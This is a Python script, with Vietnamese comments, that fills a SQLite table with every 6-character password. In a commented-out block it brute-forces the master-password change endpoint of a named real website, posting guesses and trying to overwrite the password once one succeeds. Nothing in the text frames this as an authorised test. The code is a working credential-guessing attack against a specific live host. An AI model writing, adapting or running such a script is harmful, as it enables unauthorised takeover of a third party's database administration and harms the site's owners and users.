from itertools import product
import requests
import string
import sqlite3


# Cấu hình
url = "https://tictag.vn/web/database/change_password"
charset = string.ascii_letters + string.digits + string.punctuation
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

max_length = 13  # Độ dài tối đa của mật khẩu cần thử

def generate_passwords(charset, max_length):
    for length in range(max_length, max_length + 1):
        for combo in product(charset, repeat=length):
            yield "".join(combo)

# Khởi tạo database
db_path="passwords.db"
def init_db(db_path=db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS passwords (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            password TEXT UNIQUE,
            tried INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

# Ví dụ sử dụng
init_db()
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!-?@_.'
for password in generate_passwords(charset, 6):
    try:
        print(password)
        cursor.execute("INSERT INTO passwords (password) VALUES (?)", (password,))
    except sqlite3.IntegrityError:
        pass  # Tránh trùng lặp
    conn.commit()
conn.close()

print('done')


"""
# Lấy một mật khẩu chưa thử
def get_password(db_path="passwords.db"):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT id, password FROM passwords WHERE tried = 0 ORDER BY RANDOM() LIMIT 1")
    row = cursor.fetchone()
    conn.close()
    return row  # (id, password) hoặc None nếu hết mật khẩu

# Đánh dấu mật khẩu đã thử
def mark_password_tried(password_id, db_path="passwords.db"):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("UPDATE passwords SET tried = 1 WHERE id = ?", (password_id,))
    conn.commit()
    conn.close()

password_data = get_password()
if password_data:
    password_id, password = password_data
    print(f"Thử mật khẩu: {password}")
    # Sau khi thử xong
    mark_password_tried(password_id)



for password in generate_passwords(charset, max_length):
    data = {"master_pwd": password, "master_pwd_new": "master_pwd_new"}
    response = requests.post(url, data=data, allow_redirects=False)
    
    if 'Master password update error' not in response.text:
        print(f"Tìm thấy mật khẩu đúng: {password}")
        break
    else:
        print(f"Thử {password}: Sai")
"""
